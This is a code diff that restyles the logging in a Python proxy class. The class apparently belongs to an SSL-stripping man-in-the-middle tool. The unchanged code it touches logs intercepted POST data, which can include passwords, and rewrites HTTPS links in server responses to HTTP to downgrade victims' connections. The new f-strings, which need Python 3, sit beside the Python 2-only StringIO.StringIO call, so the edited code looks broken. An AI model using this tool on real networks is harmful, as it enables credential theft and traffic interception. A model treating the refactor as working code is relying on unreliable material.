@@ -52,34 +52,54 @@ class ServerConnection(HTTPClient):
         return "POST"
 
     def sendRequest(self):
-        logging.log(self.getLogLevel(), "Client:%s Sending Request: %s %s"  % (self.client.getClientIP(), self.command, self.uri))
+        logging.log(
+            self.getLogLevel(),
+            f"Client:{self.client.getClientIP()} Sending Request: {self.command} {self.uri}",
+        )
         self.sendCommand(self.command, self.uri)
 
     def sendHeaders(self):
         for header, value in self.headers.items():
-            logging.log(self.getLogLevel(), "Client:%s Sending header: %s : %s" % (self.client.getClientIP(), header, value))
+            logging.log(
+                self.getLogLevel(),
+                f"Client:{self.client.getClientIP()} Sending header: {header} : {value}",
+            )
             self.sendHeader(header, value)
 
         self.endHeaders()
 
     def sendPostData(self):
-        logging.warning("Client:" + self.client.getClientIP() + " " + self.getPostPrefix() + " Data (" + self.headers['host'] + "):\n" + str(self.postData))
+        logging.warning(
+            f"Client:{self.client.getClientIP()} {self.getPostPrefix()} Data ("
+            + self.headers['host']
+            + "):\n"
+            + str(self.postData)
+        )
         self.transport.write(self.postData)
 
     def connectionMade(self):
-        logging.log(self.getLogLevel(), "Client:%s HTTP connection made."  % (self.client.getClientIP()))
+        logging.log(
+            self.getLogLevel(),
+            f"Client:{self.client.getClientIP()} HTTP connection made.",
+        )
         self.sendRequest()
         self.sendHeaders()
-        
+
         if (self.command == 'POST'):
             self.sendPostData()
 
     def handleStatus(self, version, code, message):
-        logging.log(self.getLogLevel(), "Client:%s Got server response: %s %s %s" % (self.client.getClientIP(), version, code, message))
+        logging.log(
+            self.getLogLevel(),
+            f"Client:{self.client.getClientIP()} Got server response: {version} {code} {message}",
+        )
         self.client.setResponseCode(int(code), message)
 
     def handleHeader(self, key, value):
-        logging.log(self.getLogLevel(), "Client:%s Got server header: %s:%s" % (self.client.getClientIP(), key, value))
+        logging.log(
+            self.getLogLevel(),
+            f"Client:{self.client.getClientIP()} Got server header: {key}:{value}",
+        )
 
         if (key.lower() == 'location'):
             value = self.replaceSecureLinks(value)
@@ -87,11 +107,13 @@ class ServerConnection(HTTPClient):
         if (key.lower() == 'content-type'):
             if (value.find('image') != -1):
                 self.isImageRequest = True
-                logging.debug("Client:%s Response is image content, not scanning..."  % (self.client.getClientIP()))
+                logging.debug(
+                    f"Client:{self.client.getClientIP()} Response is image content, not scanning..."
+                )
 
         if (key.lower() == 'content-encoding'):
             if (value.find('gzip') != -1):
-                logging.debug("Client:%s Response is compressed..."  % (self.client.getClientIP()))
+                logging.debug(f"Client:{self.client.getClientIP()} Response is compressed...")
                 self.isCompressed = True
         elif (key.lower() == 'content-length'):
             self.contentLength = value
@@ -120,17 +142,20 @@ class ServerConnection(HTTPClient):
             HTTPClient.handleResponseEnd(self)
 
     def handleResponse(self, data):
-        if (self.isCompressed):
-            logging.debug("Client:%s Decompressing content..."  % (self.client.getClientIP()))
+        if self.isCompressed:
+            logging.debug(f"Client:{self.client.getClientIP()} Decompressing content...")
             data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
-            
-        logging.log(self.getLogLevel(), "Client:" + self.client.getClientIP() + " Read from server:\n" + data)
+
+        logging.log(
+            self.getLogLevel(),
+            f"Client:{self.client.getClientIP()}" + " Read from server:\n" + data,
+        )
 
         data = self.replaceSecureLinks(data)
 
         if (self.contentLength != None):
             self.client.setHeader('Content-Length', len(data))
-        
+
         self.client.write(data)
         self.shutdown()
 
@@ -140,7 +165,9 @@ class ServerConnection(HTTPClient):
         for match in iterator:
             url = match.group()
 
-            logging.debug("Client:" + self.client.getClientIP() + " Found secure reference: " + url)
+            logging.debug(
+                f"Client:{self.client.getClientIP()} Found secure reference: {url}"
+            )
 
             url = url.replace('https://', 'http://', 1)
             url = url.replace('&amp;', '&')
